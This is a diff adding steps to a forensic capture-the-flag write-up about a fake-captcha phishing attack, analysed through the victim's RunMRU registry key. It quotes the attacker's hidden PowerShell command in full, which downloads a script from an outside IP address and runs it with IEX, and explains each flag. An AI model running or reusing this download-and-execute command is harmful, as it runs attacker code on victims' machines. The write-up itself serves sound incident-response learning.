@@ -6,7 +6,8 @@
 > Write-up author: jon-brandy
 
 ## Lessons Learned:
-1. sadas
+1. Using registry viewer to analyze registry hive.
+2. 
 
 ## SCENARIO:
 <p align="justify">Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.</p>
@@ -23,6 +24,45 @@
 > 1ST QUESTION --> ANS:
 
 ![image](https://github.com/user-attachments/assets/a78977c0-5c0a-48a5-8b36-473255407f4a)
+
+
+5. We're given many registry hives and prefetch folder, it's kinda painful to analyze windows registry hives without knowing the context and location of what is our interest.
+6. To review recently executed command, we can start analyzing from `RunMRU` registry key for **happy grunwald** user.
+7. To analyze the registry hives I used `registry explorer`. To load the registry hive for user **happy grundwald**, simply load the `NTUSER.DAT` of **happy grundwald**.
+
+![image](https://github.com/user-attachments/assets/7858c1ff-0032-44dd-9f25-eaa84c5689e5)
+
+
+> RESULT IN REGISTRY EXPLORER
+
+![image](https://github.com/user-attachments/assets/9f715145-4b36-4374-9974-973a6284cf5d)
+
+
+8. Again, to reduce the pain by traverse the folder manually, instead we can use the search bar to find **RunMRU**.
+
+![image](https://github.com/user-attachments/assets/bc3c7289-8ebd-4375-99fb-885d9f3873dc)
+
+
+9. Notice that we found a powershell command execution from a remote source. This is a hint for a malicious activity.
+
+> Malicious Powershell Script
+
+```pwsh
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1
+```
+
+#### NOTES:
+
+`-NoP` flag (No Profile), is used to prevent powershell from loading the user's profiel scripts (it can be used to reduce startup time). `-Noni` (Non-Interactive) flag is used to run the powershell script in a non-interactive mode. `-W hidden` flag is used to hides the powershell window, thus making the executiion invisible to the user.
+
+The biggest red flag is `-Exec Bypass`, this flag used to override the system's execution policy, allowing the script to run regardless of any policy settings that might prevent it. This flag is actually is the biggest red flag if it is executed by non legitimate user.
+
+`-Command` flag is used to specify the powershell command, `IEX` (Invoke Expression) this cmdlet is used to evaluate or runs the expression passed to it. `(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')` this part creates a new web client object to download the script from the remote server and this script content is passed to IEX which runs it in the current powershell session.
+
+In short, this powershell command is used to download a malicious powersell script file --> `office2024install.ps1`.
+
+
+11. Great! Simple as that now we identified the full command that was run to download and execute the stager.
 
 
 > 2ND QUESTION --> ANS:
